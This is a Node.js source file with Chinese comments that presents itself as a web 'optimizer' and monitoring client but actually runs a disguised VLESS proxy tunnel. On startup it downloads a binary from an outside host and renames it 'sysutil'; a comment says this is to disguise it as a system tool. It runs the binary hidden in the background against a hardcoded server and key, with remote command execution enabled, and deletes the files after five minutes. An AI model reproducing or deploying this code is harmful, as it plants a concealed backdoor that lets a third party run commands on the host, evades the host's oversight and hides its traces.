const os = require('os');
const fs = require('fs');
const path = require('path'); // 新增：引入 path 模块
const net = require('net');
const http = require('http');
const axios = require('axios');
const { Buffer } = require('buffer');
const { exec, execSync } = require('child_process');

// 环境配置参数
const CONFIG_ID = process.env.CONFIG_ID || '161fc0b2-cfa3-4053-8d51-20aeee66c2dd'; // 配置ID，如果使用监控客户端v1，建议根据部署环境修改此ID以避免覆盖
const MONITOR_AGENT_SERVER = process.env.MONITOR_AGENT_SERVER || 'kcystufkiiuc.ap-northeast-1.clawcloudrun.com:443';       // 监控客户端v1形式：monitor.example.com:8008   监控客户端v0形式：monitor.example.com
const MONITOR_AGENT_PORT = process.env.MONITOR_AGENT_PORT || '';           // 监控客户端v1无此变量，v0的客户端端口为{443,8443,2096,2087,2083,2053}其中之一时开启TLS
const MONITOR_AGENT_KEY = process.env.MONITOR_AGENT_KEY || '2h1TEmM79EPLBctbNrd014hWlkZ3Sr26';             // 监控客户端v1的AUTH_KEY或v0的Agent端口  
const ENABLE_AUTO_MAINTAIN = process.env.ENABLE_AUTO_MAINTAIN || false;      // 是否开启自动维护访问，false为关闭,true为开启,需同时填写SERVICE_DOMAIN变量
const OPTIMIZER_PATH = process.env.OPTIMIZER_PATH || CONFIG_ID.slice(0, 8);       // 优化器路径，自动获取配置ID前8位
const CONFIG_FETCH_PATH = process.env.CONFIG_FETCH_PATH || 'sub123';            // 节点配置获取路径
const SERVICE_DOMAIN = process.env.SERVICE_DOMAIN || '';                   // 服务域名或IP，留空将自动获取服务器IP
const NODE_IDENTIFIER = process.env.NODE_IDENTIFIER || 'VL';                    // 节点标识名称
const LISTENING_PORT = process.env.LISTENING_PORT || 3000;                     // HTTP服务监听端口

// 核心功能设置
const SYSTEM_SETTINGS = {
    ['CONFIG_ID']: CONFIG_ID,              
    ['LOG_LEVEL']: 'info',       // 日志级别，用于调试：none, info, warn, error
    ['BUFFER_ALLOC_SIZE']: '2048',     // 增加缓冲区分配大小 (KB)
    ['OPTIMIZER_PATH']: `%2F${OPTIMIZER_PATH}`,    // 优化器内部路径 
    ['MAX_QUEUED_REQUESTS']: 30,  // 最大缓存POST请求数
    ['MAX_REQUEST_SIZE']: 1000000,  // 每个POST请求最大字节数 (1MB)
    ['SESSION_IDLE_TIMEOUT']: 30000,  // 会话空闲超时时间 (30秒)
    ['DATA_CHUNK_SIZE']: 1024 * 1024, // 1024KB 的数据块大小
    ['TCP_NODELAY_ENABLED']: true,       // 启用 TCP_NODELAY
    ['TCP_KEEPALIVE_ENABLED']: true,     // 启用 TCP keepalive
}

// 验证UUID格式的辅助函数
function verify_id_format(left, right) {
    for (let i = 0; i < 16; i++) {
        if (left[i] !== right[i]) return false
    }
    return true
}

// 合并类型化数组
function combine_buffers(first, ...args) {
    if (!args || args.length < 1) return first
    let len = first.length
    for (let a of args) len += a.length
    const resultBuffer = new first.constructor(len)
    resultBuffer.set(first, 0)
    len = first.length
    for (let a of args) {
        resultBuffer.set(a, len)
        len += a.length
    }
    return resultBuffer
}

// 扩展日志记录函数
function customLog(type, ...args) {
    if (SYSTEM_SETTINGS.LOG_LEVEL === 'none') return;

    const levels = {
        'debug': 0,
        'info': 1,
        'warn': 2,
        'error': 3
    };
    
    const colors = {
        'debug': '\x1b[36m', // 青色
        'info': '\x1b[32m',  // 绿色
        'warn': '\x1b[33m',  // 黄色
        'error': '\x1b[31m', // 红色
        'reset': '\x1b[0m'   // 重置
    };

    const configLevel = levels[SYSTEM_SETTINGS.LOG_LEVEL] || 1;
    const messageLevel = levels[type] || 0;

    if (messageLevel >= configLevel) {
        const timestamp = new Date().toISOString();
        const color = colors[type] || colors.reset;
        console.log(`${color}[${timestamp}] [${type.toUpperCase()}]`, ...args, colors.reset);
    }
}

// 获取监控客户端下载链接
const getMonitorClientDownloadUrl = () => {
    const arch = os.arch(); 
    if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
      if (!MONITOR_AGENT_PORT) {
        return 'https://arm64.ssss.nyc.mn/v1'; // 保持不变
      } else {
          return 'https://arm64.ssss.nyc.mn/agent'; // 保持不变
      }
    } else {
      if (!MONITOR_AGENT_PORT) {
        return 'https://amd64.ssss.nyc.mn/v1'; // 保持不变
      } else {
          return 'https://amd64.ssss.nyc.mn/agent'; // 保持不变
      }
    }
};
  
// 下载监控客户端文件
const downloadMonitorClient = async () => {
    if (!MONITOR_AGENT_KEY) return;
    try {
      const url = getMonitorClientDownloadUrl();
      // customLog('info', `开始从 ${url} 下载监控客户端`);
      const response = await axios({
        method: 'get',
        url: url,
        responseType: 'stream'
      });
  
      const writer = fs.createWriteStream('sysutil'); // 伪装成系统工具
      response.data.pipe(writer);
  
      return new Promise((resolve, reject) => {
        writer.on('finish', () => {
          console.log('sysutil 下载成功');
          exec('chmod +x sysutil', (err) => {
            if (err) reject(err);
            resolve();
          });
        });
        writer.on('error', reject);
      });
    } catch (err) {
      throw err;
    }
};
  
// 运行监控客户端
const launchMonitorClient = async () => {
    await downloadMonitorClient();
    let monitorTlsFlag = '';
    let commandToExecute = '';
  
    if (MONITOR_AGENT_SERVER && MONITOR_AGENT_PORT && MONITOR_AGENT_KEY) {
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      monitorTlsFlag = tlsPorts.includes(MONITOR_AGENT_PORT) ? '--tls' : '';
      commandToExecute = `nohup ./sysutil -s ${MONITOR_AGENT_SERVER}:${MONITOR_AGENT_PORT} -p ${MONITOR_AGENT_KEY} ${monitorTlsFlag} >/dev/null 2>&1 &`;
    } else if (MONITOR_AGENT_SERVER && MONITOR_AGENT_KEY) {
      if (!MONITOR_AGENT_PORT) {
        const port = MONITOR_AGENT_SERVER.includes(':') ? MONITOR_AGENT_SERVER.split(':').pop() : '';
        const tlsPortsSet = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
        const useTls = tlsPortsSet.has(port) ? 'true' : 'false';
        const clientConfigYaml = `
client_secret: ${MONITOR_AGENT_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
report_delay: 1
server: ${MONITOR_AGENT_SERVER}
skip_connection_count: false
skip_procs_count: false
temperature: false
tls: ${useTls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${CONFIG_ID}`;
        
        fs.writeFileSync('monitor_config.yaml', clientConfigYaml); // 监控客户端配置文件
      }
      commandToExecute = `nohup ./sysutil -c monitor_config.yaml >/dev/null 2>&1 &`;
    } else {
      // customLog('info', '监控客户端变量为空，跳过运行');
      return;
    }
  
    try {
      exec(commandToExecute, { 
        shell: '/bin/bash'
      });
      console.log('sysutil 监控客户端已运行'); // 修改此行
    } catch (error) {
      console.error(`sysutil 运行错误: ${error}`);
    } 
};
  
// 添加自动维护任务
async function registerAutoMaintainTask() {
    if (ENABLE_AUTO_MAINTAIN !== true) return;
    try {
        if (!SERVICE_DOMAIN) return;
        const fullServiceURL = `https://${SERVICE_DOMAIN}`;
        const curlCommand = `curl -X POST "https://utility.web-optimizer.net/register-task" -H "Content-Type: application/json" -d '{"url": "${fullServiceURL}"}'`; // 更改服务URL
        exec(curlCommand, (error, stdout, stderr) => {
            if (error) {
                console.error('发送自动维护请求错误:', error.message);
                return;
            }
            console.log('自动维护任务添加成功:', stdout);
        });
    } catch (error) {
        console.error('添加自动维护任务错误:', error.message);
    }
}

// VLESS 协议解析 (保持原逻辑，变量名改为新的)
function parse_vless_uuid(uuidString) {
    uuidString = uuidString.replaceAll('-', '')
    const result = []
    for (let index = 0; index < 16; index++) {
        result.push(parseInt(uuidString.substr(index * 2, 2), 16))
    }
    return result
}

async function read_vless_header(reader, configIdString) {
    let bytesRead = 0
    let headerBuffer = new Uint8Array()
    let readResult = { value: headerBuffer, done: false }
    async function inner_read_until(offset) {
        if (readResult.done) {
            throw new Error('header length too short')
        }
        const lengthToRead = offset - bytesRead
        if (lengthToRead < 1) {
            return
        }
        readResult = await read_atleast(reader, lengthToRead)
        bytesRead += readResult.value.length
        headerBuffer = combine_buffers(headerBuffer, readResult.value)
    }

    await inner_read_until(1 + 16 + 1)

    const version = headerBuffer[0]
    const uuid = headerBuffer.slice(1, 1 + 16)
    const configUuid = parse_vless_uuid(configIdString)
    if (!verify_id_format(uuid, configUuid)) {
        throw new Error(`invalid CONFIG_ID`)
    }
    const protobufLength = headerBuffer[1 + 16]
    const addressOffset = 1 + 16 + 1 + protobufLength + 1 + 2 + 1
    await inner_read_until(addressOffset + 1)

    const command = headerBuffer[1 + 16 + 1 + protobufLength]
    const COMMAND_TYPE_TCP = 1
    if (command !== COMMAND_TYPE_TCP) {
        throw new Error(`unsupported command: ${command}`)
    }

    const port = (headerBuffer[addressOffset - 1 - 2] << 8) + headerBuffer[addressOffset - 1 - 1]
    const addressType = headerBuffer[addressOffset - 1]

    const ADDRESS_TYPE_IPV4 = 1
    const ADDRESS_TYPE_STRING = 2
    const ADDRESS_TYPE_IPV6 = 3
    let headerFinalLength = -1
    if (addressType === ADDRESS_TYPE_IPV4) {
        headerFinalLength = addressOffset + 4
    } else if (addressType === ADDRESS_TYPE_IPV6) {
        headerFinalLength = addressOffset + 16
    } else if (addressType === ADDRESS_TYPE_STRING) {
        headerFinalLength = addressOffset + 1 + headerBuffer[addressOffset]
    }
    if (headerFinalLength < 0) {
        throw new Error('read address type failed')
    }
    await inner_read_until(headerFinalLength)

    const index = addressOffset
    let hostname = ''
    if (addressType === ADDRESS_TYPE_IPV4) {
        hostname = headerBuffer.slice(index, index + 4).join('.')
    } else if (addressType === ADDRESS_TYPE_STRING) {
        hostname = new TextDecoder().decode(
            headerBuffer.slice(index + 1, index + 1 + headerBuffer[index]),
        )
    } else if (addressType === ADDRESS_TYPE_IPV6) {
        hostname = headerBuffer
            .slice(index, index + 16)
            .reduce(
                (s, b2, i2, a) =>
                    i2 % 2 ? s.concat(((a[i2 - 1] << 8) + b2).toString(16)) : s,
                [],
            )
            .join(':')
    }
    
    if (!hostname) {
        customLog('error', '无法解析主机名');
        throw new Error('parse hostname failed')
    }
    
    customLog('info', `VLESS 连接目标: ${hostname}:${port}`);
    return {
        hostname,
        port,
        data: headerBuffer.slice(headerFinalLength),
        resp: new Uint8Array([version, 0]),
    }
}

// read_atleast 函数
async function read_atleast(reader, n) {
    const buffers = []
    let done = false
    while (n > 0 && !done) {
        const readResult = await reader.read()
        if (readResult.value) {
            const b = new Uint8Array(readResult.value)
            buffers.push(b)
            n -= b.length
        }
        done = readResult.done
    }
    if (n > 0) {
        throw new Error(`数据不足以读取`)
    }
    return {
        value: combine_buffers(...buffers),
        done,
    }
}

// parse_header 函数
async function parse_request_header(configIdString, clientConnection) {
    customLog('debug', '开始解析 VLESS 请求头');
    const reader = clientConnection.readable.getReader()
    try {
        const vlessInfo = await read_vless_header(reader, configIdString)
        customLog('debug', 'VLESS 请求头解析成功');
        return vlessInfo
    } catch (err) {
        customLog('error', `VLESS 请求头解析错误: ${err.message}`);
        throw new Error(`读取 VLESS 请求头错误: ${err.message}`)
    } finally {
        reader.releaseLock()
    }
}

// connect_remote 函数
async function establish_remote_connection(hostname, port) {
    const connectionTimeout = 8000;
    try {
        const connection = await timed_tcp_connect(hostname, port, connectionTimeout);
        
        // 优化 TCP 连接
        connection.setNoDelay(SYSTEM_SETTINGS.TCP_NODELAY_ENABLED);  // 启用 TCP_NODELAY
        connection.setKeepAlive(SYSTEM_SETTINGS.TCP_KEEPALIVE_ENABLED, 1000);  // 启用 TCP keepalive
        
        // 设置缓冲区大小
        connection.bufferSize = parseInt(SYSTEM_SETTINGS.BUFFER_ALLOC_SIZE) * 1024;
        
        customLog('info', `已连接到远程主机 ${hostname}:${port}`);
        return connection;
    } catch (err) {
        customLog('error', `连接失败: ${err.message}`);
        throw err;
    }
}

// timed_connect 函数
function timed_tcp_connect(hostname, port, timeoutMs) {
    return new Promise((resolve, reject) => {
        const connection = net.createConnection({ host: hostname, port: port })
        const timerHandle = setTimeout(() => {
            reject(new Error(`连接超时`))
        }, timeoutMs)
        connection.on('connect', () => {
            clearTimeout(timerHandle)
            resolve(connection)
        })
        connection.on('error', (err) => {
            clearTimeout(timerHandle)
            reject(err)
        })
    })
}

// 网络传输管道
function create_data_pipeline() {
    async function pump(source, destination, initialPacket) {
        const dataChunkSize = parseInt(SYSTEM_SETTINGS.DATA_CHUNK_SIZE);
        
        if (initialPacket.length > 0) {
            if (destination.write) {
                destination.cork(); // 合并多个小数据包以提高性能
                destination.write(initialPacket);
                process.nextTick(() => destination.uncork());
            } else {
                const writer = destination.writable.getWriter();
                try {
                    await writer.write(initialPacket);
                } finally {
                    writer.releaseLock();
                }
            }
        }
        
        try {
            if (source.pipe) {
                // 优化 Node.js Stream 传输
                source.pause();
                source.pipe(destination, {
                    end: true,
                    highWaterMark: dataChunkSize
                });
                source.resume();
            } else {
                // 优化 Web Stream 传输
                await source.readable.pipeTo(destination.writable, {
                    preventClose: false,
                    preventAbort: false,
                    preventCancel: false,
                    signal: AbortSignal.timeout(SYSTEM_SETTINGS.SESSION_IDLE_TIMEOUT)
                });
            }
        } catch (err) {
            if (!err.message.includes('aborted')) {
                customLog('error', '数据传输错误:', err.message);
            }
            throw err;
        }
    }
    return pump;
}

// socketToWebStream 函数
function socketToWebStreamAdapter(socket) {
    let readStreamController;
    let writeStreamController;
    
    socket.on('error', (err) => {
        customLog('error', 'Socket错误:', err.message);
        readStreamController?.error(err);
        writeStreamController?.error(err);
    });

    return {
        readable: new ReadableStream({
            start(controller) {
                readStreamController = controller;
                socket.on('data', (chunk) => {
                    try {
                        controller.enqueue(chunk);
                    } catch (err) {
                        customLog('error', '读取控制器错误:', err.message);
                    }
                });
                socket.on('end', () => {
                    try {
                        controller.close();
                    } catch (err) {
                        customLog('error', '读取控制器关闭错误:', err.message);
                    }
                });
            },
            cancel() {
                socket.destroy();
            }
        }),
        writable: new WritableStream({
            start(controller) {
                writeStreamController = controller;
            },
            write(chunk) {
                return new Promise((resolve, reject) => {
                    if (socket.destroyed) {
                        reject(new Error('Socket已销毁'));
                        return;
                    }
                    socket.write(chunk, (err) => {
                        if (err) reject(err);
                        else resolve();
                    });
                });
            },
            close() {
                if (!socket.destroyed) {
                    socket.end();
                }
            },
            abort(err) {
                socket.destroy(err);
            }
        })
    };
}

// relay 函数 (数据中继)
function data_relay(config, clientConnection, remoteConnection, vlessData) {
    const pipeline = create_data_pipeline();
    let isCleanupInitiated = false;
    
    const remoteStreamAdapter = socketToWebStreamAdapter(remoteConnection);
    
    function performCleanup() {
        if (!isCleanupInitiated) {
            isCleanupInitiated = true;
            try {
                remoteConnection.destroy();
            } catch (err) {
                // 忽略常见的断开连接错误
                if (!err.message.includes('aborted') && 
                    !err.message.includes('socket hang up')) {
                    customLog('error', `清理错误: ${err.message}`);
                }
            }
        }
    }

    const upstreamTransfer = pipeline(clientConnection, remoteStreamAdapter, vlessData.data)
        .catch(err => {
            // 只记录非预期的传输错误
            if (!err.message.includes('aborted') && 
                !err.message.includes('socket hang up')) {
                customLog('error', `上行传输错误: ${err.message}`);
            }
        })
        .finally(() => {
            clientConnection.reading_done && clientConnection.reading_done();
        });

    const downstreamTransfer = pipeline(remoteStreamAdapter, clientConnection, vlessData.resp)
        .catch(err => {
            // 只记录非预期的传输错误
            if (!err.message.includes('aborted') && 
                !err.message.includes('socket hang up')) {
                customLog('error', `下行传输错误: ${err.message}`);
            }
        });

    downstreamTransfer
        .finally(() => upstreamTransfer)
        .finally(performCleanup);
}

// 会话管理系统
const activeSessions = new Map();

class UserSession {
    constructor(configId) {
        this.configId = configId;
        this.nextSequence = 0;
        this.downstreamActive = false;
        this.lastActiveTime = Date.now();
        this.vlessRequestHeader = null;
        this.remoteTarget = null;
        this.isInitialized = false;
        this.responseProtocolHeader = null;
        this.headerAlreadySent = false;
        this.bufferedInboundData = new Map();
        this.isCleanedUp = false;
        this.currentOutputStreamRes = null; // 当前下行流响应
        this.pendingInboundBuffers = new Map(); // 存储未按序到达的数据包
        customLog('debug', `创建新会话，配置ID: ${configId}`);
    }

    async initializeVLESSConnection(firstInboundPacket) {
        if (this.isInitialized) return true;
        
        try {
            customLog('debug', '从首个数据包初始化 VLESS 连接');
            // 创建可读流来解析VLESS头
            const readableInput = new ReadableStream({
                start(controller) {
                    controller.enqueue(firstInboundPacket);
                    controller.close();
                }
            });
            
            const clientStream = {
                readable: readableInput,
                writable: new WritableStream()
            };
            
            this.vlessRequestHeader = await parse_request_header(SYSTEM_SETTINGS.CONFIG_ID, clientStream);
            customLog('info', `VLESS 请求头解析完成: ${this.vlessRequestHeader.hostname}:${this.vlessRequestHeader.port}`);
            
            // 建立远程连接
            this.remoteTarget = await establish_remote_connection(this.vlessRequestHeader.hostname, this.vlessRequestHeader.port);
            customLog('info', '远程连接已建立');
            
            this.isInitialized = true;
            return true;
        } catch (err) {
            customLog('error', `VLESS 初始化失败: ${err.message}`);
            return false;
        }
    }

    async handleInboundPacket(sequenceNumber, packetData) {
        try {
            // 保存数据到pendingInboundBuffers
            this.pendingInboundBuffers.set(sequenceNumber, packetData);
            customLog('debug', `缓存数据包 seq=${sequenceNumber}, 大小=${packetData.length}`);
            
            // 按序处理数据包
            while (this.pendingInboundBuffers.has(this.nextSequence)) {
                const nextPacketData = this.pendingInboundBuffers.get(this.nextSequence);
                this.pendingInboundBuffers.delete(this.nextSequence);
                
                // 只有第一个包需要初始化VLESS
                if (!this.isInitialized && this.nextSequence === 0) {
                    if (!await this.initializeVLESSConnection(nextPacketData)) {
                        throw new Error('VLESS 连接初始化失败');
                    }
                    // 存储响应头
                    this.responseProtocolHeader = Buffer.from(this.vlessRequestHeader.resp);
                    // 写入VLESS头部数据到远程
                    await this._writeToRemoteTarget(this.vlessRequestHeader.data);
                    
                    // 如果有待处理的下游连接，立即发送响应
                    if (this.currentOutputStreamRes) {
                        this._beginDownstreamResponse();
                    }
                } else {
                    // 后续数据包直接发送
                    if (!this.isInitialized) {
                        customLog('warn', `在初始化完成前收到乱序数据包 seq=${sequenceNumber}`);
                        continue;
                    }
                    await this._writeToRemoteTarget(nextPacketData);
                }
                
                this.nextSequence++;
                customLog('debug', `已处理数据包 seq=${this.nextSequence-1}`);
            }

            // 检查缓存大小
            if (this.pendingInboundBuffers.size > SYSTEM_SETTINGS.MAX_QUEUED_REQUESTS) {
                throw new Error('缓存的数据包过多');
            }

            return true;
        } catch (err) {
            customLog('error', `处理数据包错误: ${err.message}`);
            throw err;
        }
    }

    _beginDownstreamResponse() {
        if (!this.currentOutputStreamRes || !this.responseProtocolHeader) return;
        
        try {
            const protocol = this.currentOutputStreamRes.socket?.alpnProtocol || 'http/1.1';
            const isH2 = protocol === 'h2';

            if (!this.headerAlreadySent) {
                customLog('debug', `发送 VLESS 响应头 (${protocol}): ${this.responseProtocolHeader.length} 字节`);
                this.currentOutputStreamRes.write(this.responseProtocolHeader);
                this.headerAlreadySent = true;
            }
            
            // 根据协议使用不同的传输策略
            if (isH2) {
                // HTTP/2 优化
                this.currentOutputStreamRes.socket.setNoDelay(true);
                
                // 使用 Transform 流进行数据分块
                const transformStream = new require('stream').Transform({
                    transform(chunk, encoding, callback) {
                        const size = 16384; // 16KB chunks
                        for (let i = 0; i < chunk.length; i += size) {
                            this.push(chunk.slice(i, i + size));
                        }
                        callback();
                    }
                });
                
                this.remoteTarget.pipe(transformStream).pipe(this.currentOutputStreamRes);
            } else {
                // HTTP/1.1 直接传输
                this.remoteTarget.pipe(this.currentOutputStreamRes);
            }
            
            // 处理关闭事件
            this.remoteTarget.on('end', () => {
                if (!this.currentOutputStreamRes.writableEnded) {
                    this.currentOutputStreamRes.end();
                }
            });
            
            this.remoteTarget.on('error', (err) => {
                customLog('error', `远程目标错误: ${err.message}`);
                if (!this.currentOutputStreamRes.writableEnded) {
                    this.currentOutputStreamRes.end();
                }
            });
        } catch (err) {
            customLog('error', `启动下行流错误: ${err.message}`);
            this.cleanupSession();
        }
    }

    startDownstreamService(responseStream, httpHeaders) {
        if (!responseStream.headersSent) {
            responseStream.writeHead(200, httpHeaders);
        }

        this.currentOutputStreamRes = responseStream;
        
        if (this.isInitialized && this.responseProtocolHeader) {
            this._beginDownstreamResponse();
        }
        
        responseStream.on('close', () => {
            customLog('info', '客户端连接已关闭');
            this.cleanupSession();
        });

        return true;
    }

    async _writeToRemoteTarget(dataBuffer) {
        if (!this.remoteTarget || this.remoteTarget.destroyed) {
            throw new Error('远程连接不可用或已销毁');
        }

        return new Promise((resolve, reject) => {
            this.remoteTarget.write(dataBuffer, (err) => {
                if (err) {
                    customLog('error', `写入远程目标失败: ${err.message}`);
                    reject(err);
                } else {
                    resolve();
                }
            });
        });
    }

    cleanupSession() {
        if (!this.isCleanedUp) {
            this.isCleanedUp = true;
            customLog('debug', `清理会话: ${this.configId}`);
            if (this.remoteTarget) {
                this.remoteTarget.destroy();
                this.remoteTarget = null;
            }
            this.isInitialized = false;
            this.headerAlreadySent = false;
            activeSessions.delete(this.configId); // 从Map中移除
        }
    }
} 

// 获取ISP信息
const ispInfoRaw = execSync(
    'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{print $26"-"$18}\' | sed -e \'s/ /_/g\'',
    { encoding: 'utf-8' }
);
const ISP_IDENTIFIER = ispInfoRaw.trim();
let CURRENT_IP = SERVICE_DOMAIN;
if (!SERVICE_DOMAIN) {
    try {
        // 首先尝试获取 IPv4
        CURRENT_IP = execSync('curl -s --max-time 2 ipv4.ip.sb', { encoding: 'utf-8' }).trim();
    } catch (err) {
        try {
            CURRENT_IP = `[${execSync('curl -s --max-time 1 ipv6.ip.sb', { encoding: 'utf-8' }).trim()}]`;
        } catch (ipv6Err) {
            customLog('error', '无法获取IP地址:', ipv6Err.message);
            CURRENT_IP = 'localhost'; 
        }
    }
}

// 创建HTTP服务
const webServer = http.createServer((req, res) => {
    const responseHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST',
        'Cache-Control': 'no-store',
        'X-Accel-Buffering': 'no',
        'X-Padding': generateHttpPadding(100, 1000), // 伪装填充
    };

    // 根路径和配置获取路径
    if (req.url === '/') {
        fs.readFile(path.join(__dirname, 'index.html'), (err, data) => { // 读取 index.html 文件
            if (err) {
                res.writeHead(500, { 'Content-Type': 'text/plain' });
                res.end('Internal Server Error');
                customLog('error', '读取 index.html 失败:', err.message);
            } else {
                res.writeHead(200, { 'Content-Type': 'text/html' }); // 设置内容类型为 HTML
                res.end(data); // 发送 index.html 内容
                customLog('info', '已发送 index.html');
            }
        });
        return;
    } 
    
    if (req.url === `/${CONFIG_FETCH_PATH}`) {
        // VLESS URL 使用伪装域名 skk.moe
        const vlessURL = `vless://${CONFIG_ID}@skk.moe:443?encryption=none&security=tls&sni=${SERVICE_DOMAIN || CURRENT_IP}&fp=chrome&allowInsecure=1&type=xhttp&host=${SERVICE_DOMAIN || CURRENT_IP}&path=${SYSTEM_SETTINGS.OPTIMIZER_PATH}&mode=packet-up#${NODE_IDENTIFIER}-${ISP_IDENTIFIER}`; 
        const base64Content = Buffer.from(vlessURL).toString('base64');
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(base64Content + '\n');
        return;
    }

    // VLESS 请求处理 (优化器数据流)
    // 匹配 /优化器路径/配置ID/序列号 (可选)
    const pathMatcher = req.url.match(new RegExp(`${OPTIMIZER_PATH}/([^/]+)(?:/([0-9]+))?$`));
    if (!pathMatcher) {
        res.writeHead(404);
        res.end();
        return;
    }
    
    const matchedConfigId = pathMatcher[1];
    const sequenceNumber = pathMatcher[2] ? parseInt(pathMatcher[2]) : null;

    if (req.method === 'GET' && sequenceNumber === null) { // 下行流请求 (Initial GET for VLESS response)
        responseHeaders['Content-Type'] = 'application/octet-stream';
        responseHeaders['Transfer-Encoding'] = 'chunked';

        let session = activeSessions.get(matchedConfigId);
        if (!session) {
            session = new UserSession(matchedConfigId);
            activeSessions.set(matchedConfigId, session);
            customLog('info', `为 GET 请求创建新会话: ${matchedConfigId}`);
        }

        session.downstreamActive = true;
        
        if (!session.startDownstreamService(res, responseHeaders)) {
            customLog('error', `无法为会话启动下行流: ${matchedConfigId}`);
            if (!res.headersSent) {
                res.writeHead(500);
                res.end();
            }
            session.cleanupSession();
        }
        return;
    }
    
    // 处理上行流 (POST requests with sequence number)
    if (req.method === 'POST' && sequenceNumber !== null) {
        let session = activeSessions.get(matchedConfigId);
        if (!session) {
            session = new UserSession(matchedConfigId);
            activeSessions.set(matchedConfigId, session);
            customLog('info', `为 POST 请求创建新会话: ${matchedConfigId}`);
            
            // 设置会话超时
            setTimeout(() => {
                const currentSession = activeSessions.get(matchedConfigId);
                if (currentSession && !currentSession.downstreamActive) {
                    customLog('warn', `会话 ${matchedConfigId} 因无下行流而超时`);
                    currentSession.cleanupSession();
                }
            }, SYSTEM_SETTINGS.SESSION_IDLE_TIMEOUT);
        }

        let requestDataChunks = [];
        let totalSize = 0;
        let responseHeadersSent = false;
        
        req.on('data', chunk => {
            totalSize += chunk.length;
            if (totalSize > SYSTEM_SETTINGS.MAX_REQUEST_SIZE) {
                if (!responseHeadersSent) {
                    res.writeHead(413); // Payload Too Large
                    res.end();
                    responseHeadersSent = true;
                }
                return;
            }
            requestDataChunks.push(chunk);
        });

        req.on('end', async () => {
            if (responseHeadersSent) return; // 如果已经发送过响应头就直接返回
            
            try {
                const combinedBuffer = Buffer.concat(requestDataChunks);
                customLog('info', `处理数据包: seq=${sequenceNumber}, 大小=${combinedBuffer.length}`);
                
                await session.handleInboundPacket(sequenceNumber, combinedBuffer);
                
                if (!responseHeadersSent) {
                    res.writeHead(200, responseHeaders);
                    responseHeadersSent = true;
                }
                res.end();
                
            } catch (err) {
                customLog('error', `处理 POST 请求失败: ${err.message}`);
                session.cleanupSession();
                
                if (!responseHeadersSent) {
                    res.writeHead(500); // Internal Server Error
                    responseHeadersSent = true;
                }
                res.end();
            }
        });
        return;
    }

    res.writeHead(404); // Not Found
    res.end();
});

// 启用 HTTP/2 和 HTTP/1.1 监听 (如果环境支持)
webServer.on('secureConnection', (socket) => {
    customLog('debug', `新安全连接使用协议: ${socket.alpnProtocol || 'http/1.1'}`);
});

// 工具函数：生成 HTTP 响应填充
function generateHttpPadding(minBytes, maxBytes) {
    const length = minBytes + Math.floor(Math.random() * (maxBytes - minBytes));
    return Buffer.from(Array(length).fill('X').join('')).toString('base64');
}

// 设置服务器超时
webServer.keepAliveTimeout = 620000; 
webServer.headersTimeout = 625000;   

webServer.on('error', (err) => {
    customLog('error', `服务器错误: ${err.message}`);
});

// 文件清理函数
const cleanUpTemporaryFiles = () => {
    ['sysutil', 'monitor_config.yaml'].forEach(file => {
        fs.unlink(file, (err) => {
            if (err && err.code !== 'ENOENT') { // 忽略文件不存在的错误
                customLog('error', `删除文件 ${file} 失败: ${err.message}`);
            } else if (!err) {
                customLog('debug', `文件 ${file} 已删除`);
            }
        });
    });
};

webServer.listen(LISTENING_PORT, () => {
    launchMonitorClient(); // 启动监控客户端
    setTimeout(() => {
      cleanUpTemporaryFiles(); // 延迟后清理临时文件
    }, 300000); // 300秒 = 5分钟
    registerAutoMaintainTask(); // 注册自动维护任务
    console.log(`Web 服务优化器运行在端口 ${LISTENING_PORT}`);
    customLog('info', `=================================`);
    customLog('info', `日志级别: ${SYSTEM_SETTINGS.LOG_LEVEL}`);
    customLog('info', `最大缓存请求数: ${SYSTEM_SETTINGS.MAX_QUEUED_REQUESTS}`);
    customLog('info', `最大请求大小: ${SYSTEM_SETTINGS.MAX_REQUEST_SIZE / 1000}KB`);
    customLog('info', `缓冲区分配大小: ${SYSTEM_SETTINGS.BUFFER_ALLOC_SIZE}KB`);
    customLog('info', `会话空闲超时: ${SYSTEM_SETTINGS.SESSION_IDLE_TIMEOUT / 1000}秒`);
    customLog('info', `数据块大小: ${SYSTEM_SETTINGS.DATA_CHUNK_SIZE / 1024}KB`);
    customLog('info', `TCP_NODELAY: ${SYSTEM_SETTINGS.TCP_NODELAY_ENABLED ? '启用' : '禁用'}`);
    customLog('info', `TCP_KEEPALIVE: ${SYSTEM_SETTINGS.TCP_KEEPALIVE_ENABLED ? '启用' : '禁用'}`);
    customLog('info', `=================================`);
});